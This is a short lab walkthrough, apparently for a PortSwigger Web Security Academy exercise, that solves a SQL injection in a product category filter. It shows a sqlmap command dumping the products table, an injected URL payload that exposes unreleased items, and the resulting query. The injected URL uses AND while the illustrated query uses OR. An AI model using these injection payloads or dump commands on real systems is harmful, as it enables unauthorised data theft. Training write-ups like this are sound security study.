# SQL injection vulnerability in WHERE clause allowing retrieval of hidden data

First thing you can see on web is search, after clicking it you will get URI like that:

```
https://0a6500730381d75e82ea06a500d800dd.web-security-academy.net/filter?category=Lifestyle
```

After enumerating for some time i found some unrealese product 

```
agnes@DESKTOP-DRFCAG5:/$ sqlmap -u "https://0a6500730381d75e82ea06a500d800dd.web-security-academy.net/filter?category=Lifestyle" -T products -C "category,released,name" --dump
        ___
       __H__
 ___ ___[']_____ ___ ___  {1.8.4#stable}
|_ -| . ["]     | .'| . |
|___|_  [,]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 19:02:42 /2026-02-20/

[...]

+-----------------------------------+-----------------+----------+
| name                              | category        | released |
+-----------------------------------+-----------------+----------+
| Caution Sign                      | Corporate gifts | 0        |
| Roulette Drinking Game            | Toys & Games    | 0        |
| Six Pack Beer Belt                | Accessories     | 0        |
| Conversation Controlling Lemon    | Gifts           | 0        |
| The Splash                        | Lifestyle       | 0        |
| Folding Gadgets                   | Corporate gifts | 1        |
| Cheshire Cat Grin                 | Accessories     | 1        |
| Inflatable Dartboard              | Toys & Games    | 1        |
| What Do You Meme?                 | Toys & Games    | 1        |
| Paintball Gun - Thunder Striker   | Toys & Games    | 1        |
| Couple's Umbrella                 | Gifts           | 1        |
| Snow Delivered To Your Door       | Gifts           | 1        |
| High-End Gift Wrapping            | Gifts           | 1        |
| Gym Suit                          | Lifestyle       | 1        |
| There's No Place Like Gnome       | Lifestyle       | 1        |
| The Trapster                      | Lifestyle       | 1        |
| There is No 'I' in Team           | Corporate gifts | 1        |
| The Giant Enter Key               | Corporate gifts | 1        |
| Giant Pillow Thing                | Accessories     | 1        |
| ZZZZZZ Bed - Your New Home Office | Accessories     | 1        |
+-----------------------------------+-----------------+----------+
```

So now we need to exploit web to find this product 

```
https://0a6500730381d75e82ea06a500d800dd.web-security-academy.net/filter?category=Lifestyle%27%20AND%20released=0--
```

And like that we can see all produnt that have released 0

```
SELECT * FROM products 
WHERE category = 'Gifts' OR released=0--' 
AND released = 1;
```

Code gonna look like that

<img width="1241" height="715" alt="image" src="https://github.com/user-attachments/assets/c02de537-6d9d-4029-93a1-7b549f54c210" />
